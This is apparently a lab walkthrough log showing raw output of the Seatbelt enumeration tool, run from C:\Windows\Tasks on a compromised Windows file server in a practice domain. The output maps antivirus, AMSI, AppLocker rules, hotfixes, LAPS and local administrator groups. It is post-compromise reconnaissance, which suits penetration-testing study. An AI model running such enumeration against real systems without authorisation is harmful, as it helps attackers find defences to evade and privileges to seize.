+                        &%%&&&%%%%%        v1.2.1         ,(((&%%%%%%%%%%%%%%%%%,
+                         #%%%%##,
+
+ERROR: Error running command "-all"
+
+[*] Completed collection in 0.008 seconds
+
+PS C:\Windows\Tasks> .\Seatbelt.exe -group=system
+
+                        %&&@@@&&
+                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
+                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
+%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
+#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
+#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
+#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
+#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
+###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
+#####%######################  %%%..                       @////(((&%%%%%%%################
+                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
+                        &%%&&&%%%%%        v1.2.1         ,(((&%%%%%%%%%%%%%%%%%,
+                         #%%%%##,
+
+====== AMSIProviders ======
+
+  GUID                           : {2781761E-28E0-4109-99FE-B9D127C57AFE}
+  ProviderPath                   : "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2111.5-0\MpOav.dll"
+
+====== AntiVirus ======
+
+Cannot enumerate antivirus. root\SecurityCenter2 WMI namespace is not available on Windows Servers
+====== AppLocker ======
+
+  [*] AppIDSvc service is Running
+
+    [*] Appx not configured
+  [*] AppIDSvc service is Running
+
+    [*] Dll not configured
+  [*] AppIDSvc service is Running
+
+    [*] Exe is in Enforce Mode
+      [*] <FilePublisherRule Id="a9e18c21-ff8f-43cf-b9fc-db40eed693ba" Name="(Default Rule) All signed packaged apps" Description="Allows members of the Everyone group to run packaged apps that are signed." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePublisherCondition PublisherName="*" ProductName="*" BinaryName="*"><BinaryVersionRange LowSection="0.0.0.0" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>
+
+      [*] <FilePathRule Id="921cc481-6e17-4653-8f75-050b80acca20" Name="(Default Rule) All files located in the Program Files folder" Description="Allows members of the Everyone group to run applications that are located in the Program Files folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%PROGRAMFILES%\*"/></Conditions></FilePathRule>
+
+      [*] <FilePathRule Id="a61c8b2c-a319-4cd0-9690-d2177cad7b51" Name="(Default Rule) All files located in the Windows folder" Description="Allows members of the Everyone group to run applications that are located in the Windows folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%WINDIR%\*"/></Conditions></FilePathRule>
+
+      [*] <FilePathRule Id="fd686d83-a829-4351-8ff4-27c7de5755d2" Name="(Default Rule) All files" Description="Allows members of the local Administrators group to run all applications." UserOrGroupSid="S-1-5-32-544" Action="Allow"><Conditions><FilePathCondition Path="*"/></Conditions></FilePathRule>
+
+  [*] AppIDSvc service is Running
+
+    [*] Msi not configured
+  [*] AppIDSvc service is Running
+
+    [*] Script not configured
+====== ARPTable ======
+
+  Loopback Pseudo-Interface 1 --- Index 1
+    Interface Description : Software Loopback Interface 1
+    Interface IPs      : ::1, 127.0.0.1
+    DNS Servers        : fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
+
+    Internet Address      Physical Address      Type
+    224.0.0.22            00-00-00-00-00-00     Static
+
+  Ethernet --- Index 6
+    Interface Description : AWS PV Network Device #0
+    Interface IPs      : fe80::b0db:4d99:84af:ac44%6, 10.200.95.35
+    DNS Servers        : 10.200.95.30
+
+    Internet Address      Physical Address      Type
+    10.40.0.1             00-00-00-00-00-00     Invalid
+    10.200.95.1           02-63-DC-A0-13-35     Dynamic
+    10.200.95.30          02-5B-3A-43-60-9F     Dynamic
+    10.200.95.32          02-1F-0F-45-B8-EB     Dynamic
+    10.200.95.33          02-76-2C-96-24-63     Dynamic
+    10.200.95.255         FF-FF-FF-FF-FF-FF     Static
+    224.0.0.22            01-00-5E-00-00-16     Static
+    224.0.0.251           01-00-5E-00-00-FB     Static
+    224.0.0.252           01-00-5E-00-00-FC     Static
+    255.255.255.255       FF-FF-FF-FF-FF-FF     Static
+
+====== AuditPolicies ======
+
+====== AuditPolicyRegistry ======
+
+====== AutoRuns ======
+
+  HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run :
+    C:\Windows\system32\SecurityHealthSystray.exe
+====== Certificates ======
+
+====== CertificateThumbprints ======
+
+CurrentUser\Root - 92B46C76E13054E104F230517E6E504D43AB10B5 (Symantec Enterprise Mobile Root for Microsoft) 3/14/2032 11:59:59 PM
+CurrentUser\Root - 8F43288AD272F3103B6FB1428485EA3014C0BCFE (Microsoft Root Certificate Authority 2011) 3/22/2036 10:13:04 PM
+CurrentUser\Root - 3B1EFD3A66EA28B16697394703A72CA340A05BD5 (Microsoft Root Certificate Authority 2010) 6/23/2035 10:04:01 PM
+CurrentUser\Root - 31F9FC8BA3805986B721EA7295C65B3A44534274 (Microsoft ECC TS Root Certificate Authority 2018) 2/27/2043 9:00:12 PM
+CurrentUser\Root - 06F1AA330B927B753A40E68CDF22E34BCBEF3352 (Microsoft ECC Product Root Certificate Authority 2018) 2/27/2043 8:50:46 PM
+CurrentUser\Root - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 12:00:00 PM
+CurrentUser\Root - DDFB16CD4931C973A2037D3FC83A4D7D775D05E4 (DigiCert Trusted Root G4) 1/15/2038 12:00:00 PM
+CurrentUser\Root - D4DE20D05E66FC53FE1A50882C78DB2852CAE474 (Baltimore CyberTrust Root) 5/12/2025 11:59:00 PM
+CurrentUser\Root - D1EB23A46D17D68FD92564C2F1F1601764D8E349 (AAA Certificate Services) 12/31/2028 11:59:59 PM
+CurrentUser\Root - B1BC968BD4F49D622AA89A81F2150152A41D829C (GlobalSign Root CA) 1/28/2028 12:00:00 PM
+CurrentUser\Root - AFE5D244A8D1194230FF479FE2F897BBCD7A8CB4 (COMODO RSA Certification Authority) 1/18/2038 11:59:59 PM
+CurrentUser\Root - AD7E1C28B064EF8F6003402014C3D0E3370EB58A (Starfield Class 2 Certification Authority) 6/29/2034 5:39:16 PM
+CurrentUser\Root - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/10/2031 12:00:00 AM
+CurrentUser\Root - 8782C6C304353BCFD29692D2593E7D44D934FF11 (SecureTrust CA) 12/31/2029 7:40:55 PM
+CurrentUser\Root - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 11:59:59 PM
+CurrentUser\Root - 5FB7EE0633E259DBAD0C4C9AE6D38F1A61C7DC25 (DigiCert High Assurance EV Root CA) 11/10/2031 12:00:00 AM
+CurrentUser\Root - 4EB6D578499B1CCF5F581EAD56BE3D9B6744A5E5 (VeriSign Class 3 Public Primary Certification Authority - G5) 7/16/2036 11:59:59 PM
+CurrentUser\Root - 3679CA35668772304D30A5FB873B0FA77BB70D54 (VeriSign Universal Root Certification Authority) 12/1/2037 11:59:59 PM
+CurrentUser\Root - 2B8F1B57330DBBA2D07A6C51F70EE90DDAB9AD8E (USERTrust RSA Certification Authority) 1/18/2038 11:59:59 PM
+CurrentUser\Root - 2796BAE63F1801E277261BA0D77770028F20EEE4 (Go Daddy Class 2 Certification Authority) 6/29/2034 5:06:20 PM
+CurrentUser\Root - 07E032E020B72C3F192F0628A2593A19A70F069E (Certum Trusted Network CA) 12/31/2029 12:07:37 PM
+CurrentUser\Root - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/10/2031 12:00:00 AM
+LocalMachine\Root - 92B46C76E13054E104F230517E6E504D43AB10B5 (Symantec Enterprise Mobile Root for Microsoft) 3/14/2032 11:59:59 PM
+LocalMachine\Root - 8F43288AD272F3103B6FB1428485EA3014C0BCFE (Microsoft Root Certificate Authority 2011) 3/22/2036 10:13:04 PM
+LocalMachine\Root - 3B1EFD3A66EA28B16697394703A72CA340A05BD5 (Microsoft Root Certificate Authority 2010) 6/23/2035 10:04:01 PM
+LocalMachine\Root - 31F9FC8BA3805986B721EA7295C65B3A44534274 (Microsoft ECC TS Root Certificate Authority 2018) 2/27/2043 9:00:12 PM
+LocalMachine\Root - 06F1AA330B927B753A40E68CDF22E34BCBEF3352 (Microsoft ECC Product Root Certificate Authority 2018) 2/27/2043 8:50:46 PM
+LocalMachine\Root - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 12:00:00 PM
+LocalMachine\Root - DDFB16CD4931C973A2037D3FC83A4D7D775D05E4 (DigiCert Trusted Root G4) 1/15/2038 12:00:00 PM
+LocalMachine\Root - D4DE20D05E66FC53FE1A50882C78DB2852CAE474 (Baltimore CyberTrust Root) 5/12/2025 11:59:00 PM
+LocalMachine\Root - D1EB23A46D17D68FD92564C2F1F1601764D8E349 (AAA Certificate Services) 12/31/2028 11:59:59 PM
+LocalMachine\Root - B1BC968BD4F49D622AA89A81F2150152A41D829C (GlobalSign Root CA) 1/28/2028 12:00:00 PM
+LocalMachine\Root - AFE5D244A8D1194230FF479FE2F897BBCD7A8CB4 (COMODO RSA Certification Authority) 1/18/2038 11:59:59 PM
+LocalMachine\Root - AD7E1C28B064EF8F6003402014C3D0E3370EB58A (Starfield Class 2 Certification Authority) 6/29/2034 5:39:16 PM
+LocalMachine\Root - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/10/2031 12:00:00 AM
+LocalMachine\Root - 8782C6C304353BCFD29692D2593E7D44D934FF11 (SecureTrust CA) 12/31/2029 7:40:55 PM
+LocalMachine\Root - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 11:59:59 PM
+LocalMachine\Root - 5FB7EE0633E259DBAD0C4C9AE6D38F1A61C7DC25 (DigiCert High Assurance EV Root CA) 11/10/2031 12:00:00 AM
+LocalMachine\Root - 4EB6D578499B1CCF5F581EAD56BE3D9B6744A5E5 (VeriSign Class 3 Public Primary Certification Authority - G5) 7/16/2036 11:59:59 PM
+LocalMachine\Root - 3679CA35668772304D30A5FB873B0FA77BB70D54 (VeriSign Universal Root Certification Authority) 12/1/2037 11:59:59 PM
+LocalMachine\Root - 2B8F1B57330DBBA2D07A6C51F70EE90DDAB9AD8E (USERTrust RSA Certification Authority) 1/18/2038 11:59:59 PM
+LocalMachine\Root - 2796BAE63F1801E277261BA0D77770028F20EEE4 (Go Daddy Class 2 Certification Authority) 6/29/2034 5:06:20 PM
+LocalMachine\Root - 07E032E020B72C3F192F0628A2593A19A70F069E (Certum Trusted Network CA) 12/31/2029 12:07:37 PM
+LocalMachine\Root - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/10/2031 12:00:00 AM
+CurrentUser\CertificateAuthority - FEE449EE0E3965A5246F000E87FDE2A065FD89D4 (Root Agency) 12/31/2039 11:59:59 PM
+LocalMachine\CertificateAuthority - FEE449EE0E3965A5246F000E87FDE2A065FD89D4 (Root Agency) 12/31/2039 11:59:59 PM
+CurrentUser\AuthRoot - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 12:00:00 PM
+CurrentUser\AuthRoot - DDFB16CD4931C973A2037D3FC83A4D7D775D05E4 (DigiCert Trusted Root G4) 1/15/2038 12:00:00 PM
+CurrentUser\AuthRoot - D4DE20D05E66FC53FE1A50882C78DB2852CAE474 (Baltimore CyberTrust Root) 5/12/2025 11:59:00 PM
+CurrentUser\AuthRoot - D1EB23A46D17D68FD92564C2F1F1601764D8E349 (AAA Certificate Services) 12/31/2028 11:59:59 PM
+CurrentUser\AuthRoot - B1BC968BD4F49D622AA89A81F2150152A41D829C (GlobalSign Root CA) 1/28/2028 12:00:00 PM
+CurrentUser\AuthRoot - AFE5D244A8D1194230FF479FE2F897BBCD7A8CB4 (COMODO RSA Certification Authority) 1/18/2038 11:59:59 PM
+CurrentUser\AuthRoot - AD7E1C28B064EF8F6003402014C3D0E3370EB58A (Starfield Class 2 Certification Authority) 6/29/2034 5:39:16 PM
+CurrentUser\AuthRoot - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/10/2031 12:00:00 AM
+CurrentUser\AuthRoot - 8782C6C304353BCFD29692D2593E7D44D934FF11 (SecureTrust CA) 12/31/2029 7:40:55 PM
+CurrentUser\AuthRoot - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 11:59:59 PM
+CurrentUser\AuthRoot - 5FB7EE0633E259DBAD0C4C9AE6D38F1A61C7DC25 (DigiCert High Assurance EV Root CA) 11/10/2031 12:00:00 AM
+CurrentUser\AuthRoot - 4EB6D578499B1CCF5F581EAD56BE3D9B6744A5E5 (VeriSign Class 3 Public Primary Certification Authority - G5) 7/16/2036 11:59:59 PM
+CurrentUser\AuthRoot - 3679CA35668772304D30A5FB873B0FA77BB70D54 (VeriSign Universal Root Certification Authority) 12/1/2037 11:59:59 PM
+CurrentUser\AuthRoot - 2B8F1B57330DBBA2D07A6C51F70EE90DDAB9AD8E (USERTrust RSA Certification Authority) 1/18/2038 11:59:59 PM
+CurrentUser\AuthRoot - 2796BAE63F1801E277261BA0D77770028F20EEE4 (Go Daddy Class 2 Certification Authority) 6/29/2034 5:06:20 PM
+CurrentUser\AuthRoot - 07E032E020B72C3F192F0628A2593A19A70F069E (Certum Trusted Network CA) 12/31/2029 12:07:37 PM
+CurrentUser\AuthRoot - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/10/2031 12:00:00 AM
+LocalMachine\AuthRoot - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 12:00:00 PM
+LocalMachine\AuthRoot - DDFB16CD4931C973A2037D3FC83A4D7D775D05E4 (DigiCert Trusted Root G4) 1/15/2038 12:00:00 PM
+LocalMachine\AuthRoot - D4DE20D05E66FC53FE1A50882C78DB2852CAE474 (Baltimore CyberTrust Root) 5/12/2025 11:59:00 PM
+LocalMachine\AuthRoot - D1EB23A46D17D68FD92564C2F1F1601764D8E349 (AAA Certificate Services) 12/31/2028 11:59:59 PM
+LocalMachine\AuthRoot - B1BC968BD4F49D622AA89A81F2150152A41D829C (GlobalSign Root CA) 1/28/2028 12:00:00 PM
+LocalMachine\AuthRoot - AFE5D244A8D1194230FF479FE2F897BBCD7A8CB4 (COMODO RSA Certification Authority) 1/18/2038 11:59:59 PM
+LocalMachine\AuthRoot - AD7E1C28B064EF8F6003402014C3D0E3370EB58A (Starfield Class 2 Certification Authority) 6/29/2034 5:39:16 PM
+LocalMachine\AuthRoot - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/10/2031 12:00:00 AM
+LocalMachine\AuthRoot - 8782C6C304353BCFD29692D2593E7D44D934FF11 (SecureTrust CA) 12/31/2029 7:40:55 PM
+LocalMachine\AuthRoot - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 11:59:59 PM
+LocalMachine\AuthRoot - 5FB7EE0633E259DBAD0C4C9AE6D38F1A61C7DC25 (DigiCert High Assurance EV Root CA) 11/10/2031 12:00:00 AM
+LocalMachine\AuthRoot - 4EB6D578499B1CCF5F581EAD56BE3D9B6744A5E5 (VeriSign Class 3 Public Primary Certification Authority - G5) 7/16/2036 11:59:59 PM
+LocalMachine\AuthRoot - 3679CA35668772304D30A5FB873B0FA77BB70D54 (VeriSign Universal Root Certification Authority) 12/1/2037 11:59:59 PM
+LocalMachine\AuthRoot - 2B8F1B57330DBBA2D07A6C51F70EE90DDAB9AD8E (USERTrust RSA Certification Authority) 1/18/2038 11:59:59 PM
+LocalMachine\AuthRoot - 2796BAE63F1801E277261BA0D77770028F20EEE4 (Go Daddy Class 2 Certification Authority) 6/29/2034 5:06:20 PM
+LocalMachine\AuthRoot - 07E032E020B72C3F192F0628A2593A19A70F069E (Certum Trusted Network CA) 12/31/2029 12:07:37 PM
+LocalMachine\AuthRoot - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/10/2031 12:00:00 AM
+====== CredGuard ======
+
+====== DNSCache ======
+
+  Entry                          : dc-srv01.holo.live
+  Name                           : DC-SRV01.holo.live
+  Data                           : 10.200.95.30
+
+====== DotNet ======
+
+  Installed CLR Versions
+      4.0.30319
+
+  Installed .NET Versions
+      4.7.03190
+
+  Anti-Malware Scan Interface (AMSI)
+      OS supports AMSI           : True
+     .NET version support AMSI   : False
+====== EnvironmentPath ======
+
+  Name                           : C:\Windows\system32
+  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)
+
+  Name                           : C:\Windows
+  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)
+
+  Name                           : C:\Windows\System32\Wbem
+  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)
+
+  Name                           : C:\Windows\System32\WindowsPowerShell\v1.0\
+  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)
+
+  Name                           : C:\Windows\System32\OpenSSH\
+  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)
+
+  Name                           : C:\Program Files\Amazon\cfn-bootstrap\
+  SDDL                           : O:SYD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)
+
+  Name                           : C:\Users\watamet\AppData\Local\Microsoft\WindowsApps
+  SDDL                           : O:S-1-5-21-471847105-3603022926-1728018720-1132D:(A;OICIID;FA;;;SY)(A;OICIID;FA;;;BA)(A;OICIID;FA;;;S-1-5-21-471847105-3603022926-1728018720-1132)
+
+====== EnvironmentVariables ======
+
+  <SYSTEM>                           ComSpec                            %SystemRoot%\system32\cmd.exe
+  <SYSTEM>                           DriverData                         C:\Windows\System32\Drivers\DriverData
+  <SYSTEM>                           OS                                 Windows_NT
+  <SYSTEM>                           Path                               %SystemRoot%\system32;%SystemRoot%;%SystemRoot%\System32\Wbem;%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\;%SYSTEMROOT%\System32\OpenSSH\;C:\Program Files\Amazon\cfn-bootstrap\
+  <SYSTEM>                           PATHEXT                            .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
+  <SYSTEM>                           PROCESSOR_ARCHITECTURE             AMD64
+  <SYSTEM>                           PSModulePath                       %ProgramFiles%\WindowsPowerShell\Modules;%SystemRoot%\system32\WindowsPowerShell\v1.0\Modules;C:\Program Files (x86)\AWS Tools\PowerShell\
+  <SYSTEM>                           TEMP                               %SystemRoot%\TEMP
+  <SYSTEM>                           TMP                                %SystemRoot%\TEMP
+  <SYSTEM>                           USERNAME                           SYSTEM
+  <SYSTEM>                           windir                             %SystemRoot%
+  <SYSTEM>                           NUMBER_OF_PROCESSORS               1
+  <SYSTEM>                           PROCESSOR_LEVEL                    6
+  <SYSTEM>                           PROCESSOR_IDENTIFIER               Intel64 Family 6 Model 63 Stepping 2, GenuineIntel
+  <SYSTEM>                           PROCESSOR_REVISION                 3f02
+  NT AUTHORITY\SYSTEM                Path                               %USERPROFILE%\AppData\Local\Microsoft\WindowsApps;
+  NT AUTHORITY\SYSTEM                TEMP                               %USERPROFILE%\AppData\Local\Temp
+  NT AUTHORITY\SYSTEM                TMP                                %USERPROFILE%\AppData\Local\Temp
+  HOLOLIVE\watamet                   Path                               %USERPROFILE%\AppData\Local\Microsoft\WindowsApps;
+  HOLOLIVE\watamet                   TEMP                               %USERPROFILE%\AppData\Local\Temp
+  HOLOLIVE\watamet                   TMP                                %USERPROFILE%\AppData\Local\Temp
+====== Hotfixes ======
+
+Enumerating Windows Hotfixes. For *all* Microsoft updates, use the 'MicrosoftUpdates' command.
+
+  KB4580422  11/11/2020 12:00:00 AM Update                         NT AUTHORITY\SYSTEM
+  KB4470502  12/12/2018 12:00:00 AM Update                         NT AUTHORITY\SYSTEM
+  KB4470788  12/12/2018 12:00:00 AM Security Update                NT AUTHORITY\SYSTEM
+  KB4480056  1/9/2019 12:00:00 AM   Update                         NT AUTHORITY\SYSTEM
+  KB4493510  4/21/2019 12:00:00 AM  Security Update                NT AUTHORITY\SYSTEM
+  KB4494174  3/18/2020 12:00:00 AM  Update                         NT AUTHORITY\SYSTEM
+  KB4499728  5/15/2019 12:00:00 AM  Security Update                NT AUTHORITY\SYSTEM
+  KB4504369  6/12/2019 12:00:00 AM  Security Update                NT AUTHORITY\SYSTEM
+  KB4512577  9/11/2019 12:00:00 AM  Security Update                NT AUTHORITY\SYSTEM
+  KB4512937  9/6/2019 12:00:00 AM   Security Update                NT AUTHORITY\SYSTEM
+  KB4521862  10/9/2019 12:00:00 AM  Security Update                NT AUTHORITY\SYSTEM
+  KB4523204  11/13/2019 12:00:00 AM Security Update                NT AUTHORITY\SYSTEM
+  KB4539571  3/18/2020 12:00:00 AM  Security Update                NT AUTHORITY\SYSTEM
+  KB4549947  4/15/2020 12:00:00 AM  Security Update                NT AUTHORITY\SYSTEM
+  KB4558997  7/15/2020 12:00:00 AM  Security Update                NT AUTHORITY\SYSTEM
+  KB4562562  6/10/2020 12:00:00 AM  Security Update                NT AUTHORITY\SYSTEM
+  KB4566424  8/12/2020 12:00:00 AM  Security Update                NT AUTHORITY\SYSTEM
+  KB4570332  9/9/2020 12:00:00 AM   Security Update                NT AUTHORITY\SYSTEM
+  KB4577667  10/14/2020 12:00:00 AM Security Update                NT AUTHORITY\SYSTEM
+  KB4580325  10/14/2020 12:00:00 AM Security Update                NT AUTHORITY\SYSTEM
+  KB4587735  11/11/2020 12:00:00 AM Security Update                NT AUTHORITY\SYSTEM
+  KB4586793  11/11/2020 12:00:00 AM Security Update                NT AUTHORITY\SYSTEM
+====== InterestingProcesses ======
+
+    Category     : defensive
+    Name         : MsMpEng.exe
+    Product      : Windows Defender AV
+    ProcessID    : 2376
+    Owner        :
+    CommandLine  :
+
+    Category     : interesting
+    Name         : powershell.exe
+    Product      : PowerShell host process
+    ProcessID    : 3052
+    Owner        :
+    CommandLine  :
+
+    Category     : interesting
+    Name         : cmd.exe
+    Product      : Command Prompt
+    ProcessID    : 5080
+    Owner        : HOLOLIVE\watamet
+    CommandLine  : "C:\Windows\system32\cmd.exe"
+
+    Category     : interesting
+    Name         : powershell.exe
+    Product      : PowerShell host process
+    ProcessID    : 4464
+    Owner        : HOLOLIVE\watamet
+    CommandLine  : powershell
+
+====== InternetSettings ======
+
+General Settings
+  Hive                               Key : Value
+
+  HKCU          DisableCachingOfSSLPages : 0
+  HKCU                IE5_UA_Backup_Flag : 5.0
+  HKCU                   PrivacyAdvanced : 1
+  HKCU                   SecureProtocols : 2688
+  HKCU                        User Agent : Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+  HKCU             CertificateRevocation : 1
+  HKCU              ZonesSecurityUpgrade : System.Byte[]
+  HKCU                WarnonZoneCrossing : 0
+  HKCU                   EnableNegotiate : 1
+  HKCU                      MigrateProxy : 1
+  HKCU                       ProxyEnable : 0
+  HKCU                      ActiveXCache : C:\Windows\Downloaded Program Files
+  HKCU                CodeBaseSearchPath : CODEBASE
+  HKCU                    EnablePunycode : 1
+  HKCU                      MinorVersion : 0
+  HKCU                    WarnOnIntranet : 1
+
+URLs by Zone
+  No URLs configured
+
+Zone Auth Settings
+====== LAPS ======
+
+  LAPS Enabled                          : False
+  LAPS Admin Account Name               :
+  LAPS Password Complexity              :
+  LAPS Password Length                  :
+  LAPS Expiration Protection Enabled    :
+====== LastShutdown ======
+
+  LastShutdown                   : 2/7/2023 1:25:06 AM
+
+====== LocalGPOs ======
+
+====== LocalGroups ======
+
+Non-empty Local Groups (and memberships)
+
+  ** PC-FILESRV01\Administrators ** (Administrators have complete and unrestricted access to the computer/domain)
+
+  User            PC-FILESRV01\Administrator               S-1-5-21-4241685735-4112329853-1893400299-500
+  Group           HOLOLIVE\Domain Admins                   S-1-5-21-471847105-3603022926-1728018720-512
+
+  ** PC-FILESRV01\Guests ** (Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted)
+
+  User            PC-FILESRV01\Guest                       S-1-5-21-4241685735-4112329853-1893400299-501
+
+  ** PC-FILESRV01\Remote Desktop Users ** (Members in this group are granted the right to logon remotely)
+
+  User            HOLOLIVE\watamet                         S-1-5-21-471847105-3603022926-1728018720-1132
+  User            HOLOLIVE\Administrator                   S-1-5-21-471847105-3603022926-1728018720-500
+  Group           HOLOLIVE\Domain Admins                   S-1-5-21-471847105-3603022926-1728018720-512
+  Group           HOLOLIVE\Enterprise Admins               S-1-5-21-471847105-3603022926-1728018720-519
+
+  ** PC-FILESRV01\System Managed Accounts Group ** (Members of this group are managed by the system.)
+
+  User            PC-FILESRV01\DefaultAccount              S-1-5-21-4241685735-4112329853-1893400299-503
+
+  ** PC-FILESRV01\Users ** (Users are prevented from making accidental or intentional system-wide changes and can run most applications)
+
+  WellKnownGroup  NT AUTHORITY\INTERACTIVE                 S-1-5-4
+  WellKnownGroup  NT AUTHORITY\Authenticated Users         S-1-5-11
+  Group           HOLOLIVE\Domain Users                    S-1-5-21-471847105-3603022926-1728018720-513
+
+====== LocalUsers ======
+
+  ComputerName                   : localhost
+  UserName                       : Administrator
+  Enabled                        : True
+  Rid                            : 500
+  UserType                       : Administrator
+  Comment                        : Built-in account for administering the computer/domain
+  PwdLastSet                     : 11/15/2020 6:41:13 PM
+  LastLogon                      : 2/7/2023 1:35:56 AM
+  NumLogins                      : 158
+
+  ComputerName                   : localhost
+  UserName                       : DefaultAccount
+  Enabled                        : False
+  Rid                            : 503
+  UserType                       : Guest
+  Comment                        : A user account managed by the system.
+  PwdLastSet                     : 1/1/1970 12:00:00 AM
